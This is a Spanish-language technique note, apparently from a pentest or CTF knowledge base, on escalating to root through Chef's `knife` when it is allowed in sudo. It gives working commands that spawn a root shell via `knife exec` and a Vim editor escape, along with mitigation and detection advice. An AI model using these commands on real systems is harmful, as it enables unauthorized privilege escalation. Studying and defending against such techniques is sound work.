---
topic: Chef knife — ejecución de Ruby con sudo
tags: [linux, chef, knife, ruby, privesc]
---

# Chef knife — ejecución de Ruby con sudo

[🌐 English](chef-knife-privesc.en.md) | **Español**

## Concepto

`knife` es la CLI de Chef Infra. Su subcomando `exec` evalúa código Ruby en el contexto de la estación de trabajo; si el usuario puede ejecutarlo con sudo, obtiene ejecución como root. Otra variante abre un editor desde `data bag create`, que también permite escapar.

## Cuándo aplica

- `sudo -l` muestra `knife` sin contraseña o con una regla amplia.
- Chef está instalado en el host y el binario es accesible.
- Se busca una escalada directa desde un usuario con pocos privilegios.

## Procedimiento

1. Revisar `sudo -l` y confirmar la ruta exacta de `knife`.
2. Ejecutar `knife exec` con código Ruby que lance una shell.
3. Si `exec` está restringido, usar `data bag create` para abrir Vim y escapar con `:!/bin/bash`.
4. Verificar `id` y leer la flag.

## Comandos

```bash
sudo -l
sudo knife exec -E "exec '/bin/bash'"
# Variante con editor
sudo knife data bag create tmp prueba -e vim
# Dentro de Vim: :!/bin/bash
```

## Variantes

- `knife node show` con un `--format` manipulable.
- Un cookbook o recipe que se evalúa al ejecutar `knife`.
- Un plugin de knife escribible por el usuario.

## Limitaciones

- La regla sudo debe permitir el subcomando concreto.
- Ruby puede estar restringido por una política de AppArmor o SELinux.
- La versión de Chef puede cambiar los subcomandos disponibles.

## Mitigación

- No incluir `knife` en reglas sudo; usar un wrapper con subcomandos fijos.
- Eliminar la herramienta de hosts que no la necesiten.
- Auditar los permisos de plugins y cookbooks.

## Detección

- Procesos `knife` ejecutados como root fuera de un despliegue.
- Shells hijas de Ruby o de `knife`.
- Uso de `data bag` con editores interactivos en producción.

## Referencias

- [0xdf — Knife](https://0xdf.gitlab.io/2021/08/28/htb-knife.html)
- [GTFOBins — knife](https://gtfobins.github.io/gtfobins/knife/)
- [Chef — knife exec](https://docs.chef.io/workstation/knife_exec/)
